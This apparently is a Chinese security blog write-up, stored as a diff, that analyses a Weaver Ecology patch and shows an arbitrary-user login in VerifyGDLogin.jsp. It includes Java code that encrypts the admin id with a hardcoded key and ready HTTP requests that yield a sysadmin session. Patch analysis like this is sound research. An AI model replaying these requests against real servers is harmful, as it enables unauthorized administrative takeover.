@@ -1,0 +1,93 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="b488cc2b0e10f9dcafd38dfb94ca5ded">0x01 前言</h2>
+<p>在跟踪泛微补丁包时发现<code>Ecology_security_20230725_v9.0_v10.58.3</code>的<code>SecurityRuleGdLogin0317</code>的补丁疑似修复了一个SQL注入，因此跟踪下看看</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129151943-aac0797e-8e87-1.png"/></p>
+<p>上图为补丁关键操作，看内容像是进行了SQL注入检测，后续分析发现是一处任意用户登录</p>
+<h2 data-content="1" id="49420628d7573a2f149f0466945d3d8b">0x02 分析</h2>
+<p>跟踪关键文件<code>login/VerifyGDLogin.jsp</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152010-bb4972aa-8e87-1.png"/></p>
+<p>看源码为从URI中获取<code>para</code>、<code>para1</code>、<code>para2</code>后调用<code>PoppupRemindInfoUtil.decrypt</code>对<code>para2</code>做解密，然后通过<code>weaver.login.VerifyGDLogin#getUserCheck</code>方法进行登录校验</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152019-c065a394-8e87-1.png"/></p>
+<p>其中<code>PoppupRemindInfoUtil.decrypt</code>方法首先会校验<code>WEB-INF/prop/AESpassword.properties</code>中的<code>pwd</code>项是否为空，不为空则赋值给<code>var1</code>，为空则给<code>var1</code>赋值<code>1</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152024-c3286238-8e87-1.png"/></p>
+<p>然后使用<code>SM4IntegrationUtil.USE_SM4</code>方法判断是否启用了国密<code>SM4加密算法</code>，如启用则使用SM4解密，否则调用<code>AES.decrypt</code>进行解密，默认为<code>false</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152028-c5e8ff8c-8e87-1.png"/></p>
+<p>其中<code>AES.decrypt</code>方法如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152034-c9381a74-8e87-1.png"/></p>
+<p>那么加密函数就为<code>AES.encrypt</code>，代码如下</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">encryptAES_SunJCE</span><span class="o">(</span><span class="n">String</span> <span class="n">var0</span><span class="o">,</span> <span class="n">String</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">KeyGenerator</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">KeyGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES"</span><span class="o">);</span>
+            <span class="n">SecureRandom</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">SecureRandom</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"SHA1PRNG"</span><span class="o">);</span>
+            <span class="n">var4</span><span class="o">.</span><span class="na">setSeed</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
+            <span class="n">var3</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">128</span><span class="o">,</span> <span class="n">var4</span><span class="o">);</span>
+            <span class="n">SecretKey</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var3</span><span class="o">.</span><span class="na">generateKey</span><span class="o">();</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getEncoded</span><span class="o">();</span>
+            <span class="n">SecretKeySpec</span> <span class="n">var7</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SecretKeySpec</span><span class="o">(</span><span class="n">var6</span><span class="o">,</span> <span class="s">"AES"</span><span class="o">);</span>
+            <span class="n">Cipher</span> <span class="n">var8</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES"</span><span class="o">,</span> <span class="s">"SunJCE"</span><span class="o">);</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">var9</span> <span class="o">=</span> <span class="n">var0</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
+            <span class="n">var8</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">var7</span><span class="o">);</span>
+            <span class="n">var2</span> <span class="o">=</span> <span class="n">var8</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">var9</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">NoSuchProviderException</span> <span class="n">var10</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var10</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">NoSuchAlgorithmException</span> <span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var11</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">NoSuchPaddingException</span> <span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var12</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">InvalidKeyException</span> <span class="n">var13</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var13</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">IllegalBlockSizeException</span> <span class="n">var14</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var14</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">BadPaddingException</span> <span class="n">var15</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var15</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">var2</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="s">""</span> <span class="o">:</span> <span class="n">Tools</span><span class="o">.</span><span class="na">parseByte2HexStr</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>生成加密数据的代码</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.pluginweaver.utils.CryptTool</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testAesCrypt</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">//4DUa6Wq9</span>
+        <span class="c1">//1</span>
+        <span class="n">String</span> <span class="n">cryptStr</span><span class="o">=</span><span class="s">"1"</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">enStr</span><span class="o">=</span><span class="n">CryptTool</span><span class="o">.</span><span class="na">encryptAES_SunJCE</span><span class="o">(</span> <span class="n">cryptStr</span><span class="o">,</span><span class="s">"4DUa6Wq9"</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">enStr</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152041-cd4ac2e2-8e87-1.png"/></p>
+<h2 data-content="1" id="3e23c6d0467f2bf5765e1b39721e308d">0x03 Exploit</h2>
+<p>按照前文分析构造好数据包后发送</p>
+<pre><code>POST /login/VerifyGDLogin.jsp HTTP/1.1
+Host: 192.168.232.129
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+
+para=ViewRequest.jsp&amp;para1=123&amp;para2=E4D160ED60A81E804F24EE2AE592D66F</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152047-d0e81512-8e87-1.png"/></p>
+<p>复制返回的<code>ecology_JSessionid</code>访问需要鉴权的接口即可以<code>sysadmin</code>登录</p>
+<pre><code>GET /api/hrm/login/getAccountList?__random__=1700633695101 HTTP/1.1
+Host: 192.168.232.129
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+Referer: http://192.168.232.129/wui/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: ecology_JSessionid=aaaOhmJeYzN2NbvHFv1Vy;
+Connection: close</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231129152052-d3e42fa8-8e87-1.png"/></p>
+</div>
+</div>
